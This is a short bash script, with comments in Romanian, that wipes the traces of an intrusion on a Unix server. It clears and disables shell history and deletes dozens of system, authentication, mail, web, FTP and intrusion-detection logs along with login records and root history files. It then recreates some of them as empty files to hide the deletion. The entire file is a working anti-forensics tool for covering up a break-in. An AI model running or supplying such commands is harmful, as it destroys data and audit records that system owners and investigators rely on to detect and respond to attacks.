#! /bin/bash
##########  Pentru a rula script-ul trebuie sa folosesti doar ". clear.sh"  ##########
history -c
history -rc
clear ; unset ; rm -rf /var/run/utmp /var/log/wtmp /var/log/lastlog /var/log/messages /var/log/secure /var/log/xferlog /var/log/maillog /root/.bash_history ; unset HISTFILE ; unset HISTSAVE ; unset HISTLOG ; history -n ; unset WATCH ; export HISTFILE=/dev/null ; export HISTFILE=/dev/null
rm -rf /var/log/lastlog
rm -rf $HOME/.bash_history
rm -rf /var/log/messages
rm -rf /var/log/warn
rm -rf /var/log/wtmp
rm -rf /var/log/poplog
rm -rf /var/log/qmail
rm -rf /var/log/smtpd
rm -rf /var/log/telnetd
rm -rf /var/log/secure
rm -rf /var/log/auth
rm -rf /var/log/auth.log
rm -rf /var/log/cups/access_log
rm -rf /var/log/cups/error_log
rm -rf /var/log/thttpd_log
rm -rf /var/log/spooler
rm -rf /var/spool/tmp
rm -rf /var/spool/errors
rm -rf /var/spool/locks
rm -rf /var/log/nctfpd.errs
rm -rf /var/log/acct
rm -rf /var/apache/log
rm -rf /var/apache/logs
rm -rf /usr/local/apache/log
rm -rf /usr/local/apache/logs
rm -rf /usr/local/www/logs/thttpd_log
rm -rf /var/log/news
rm -rf /var/log/news/news
rm -rf /var/log/news.all
rm -rf /var/log/news/news.all
rm -rf /var/log/news/news.crit
rm -rf /var/log/news/news.err
rm -rf /var/log/news/news.notice
rm -rf /var/log/news/suck.err
rm -rf /var/log/news/suck.notice
rm -rf /var/log/xferlog
rm -rf /var/log/proftpd/xferlog.legacy
rm -rf /var/log/proftpd.xferlog
rm -rf /var/log/proftpd.access_log
rm -rf /var/log/httpd/error_log
rm -rf /var/log/httpsd/ssl_log
rm -rf /var/log/httpsd/ssl.access_log
rm -rf /var/adm
rm -rf /var/run/utmp
rm -rf /etc/wtmp
rm -rf /etc/utmp
rm -rf /etc/mail/access
rm -rf /var/log/mail/info.log
rm -rf /var/log/mail/errors.log
rm -rf /var/log/httpd/*_log
rm -rf /var/log/ncftpd/misclog.txt
rm -rf /var/account/pacct
rm -rf /var/log/snort
rm -rf /var/log/bandwidth
rm -rf /var/log/explanations
rm -rf /var/log/syslog
rm -rf /var/log/user.log
rm -rf /var/log/daemons/info.log
rm -rf /var/log/daemons/warnings.log
rm -rf /var/log/daemons/errors.log
rm -rf /etc/httpd/logs/error_log
rm -rf /etc/httpd/logs/*_log
rm -rf /var/log/mysqld/mysqld.log
rm -rf /root/.ksh_history
rm -rf /root/.bash_history
rm -rf /root/.sh_history
rm -rf /root/.history
rm -rf /root/*_history
rm -rf /root/.login
rm -rf /root/.logout
rm -rf /root/.bash_logut
rm -rf /root/.Xauthority
set +o history;history -rc;unset HISTFILE;unset HISTSIZE;unset $HISTFILE;unset $HISTSIZE;rm -rf $HISTFILE;rm -rf ~/.ksh_history;rm -rf ~/.bash_history;rm -rf ~/.bash_logout;rm -rf /root/.ksh_history;rm -rf /root/.bash_history;rm -rf /root/.bash_logout;rm -rf /var/log/faillog;rm -rf /var/log/lastlog;rm -rf /var/log/mail;rm -rf /var/log/maillog;rm -rf /var/log/messages;rm -rf /var/log/secure;rm -rf /var/log/syslog;rm -rf /var/log/wtmp;rm -rf /var/log/xferlog;rm -rf /var/run/utmp;touch ~/.ksh_history;touch ~/.bash_history;touch ~/.bash_logout;touch /root/.ksh_history;touch /root/.bash_history;touch /root/.bash_logout;touch /var/log/faillog;touch /var/log/lastlog;touch /var/log/mail;touch /var/log/maillog;touch /var/log/messages;touch /var/log/secure;touch /var/log/syslog;touch /var/log/wtmp;touch /var/log/xferlog;touch /var/run/utmp;history -rc;unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHOST;unset HISTFILE HISTSAVE HISTLOG SCREEN WATCH
rm -rf /root/.bash_history
rm -rf $HOME/.bash_history
rm -rf /var/log/*
set +o history
history -c
history -rc
printf "\e[92mAm terminat - clear log by ez \e[0m\n"

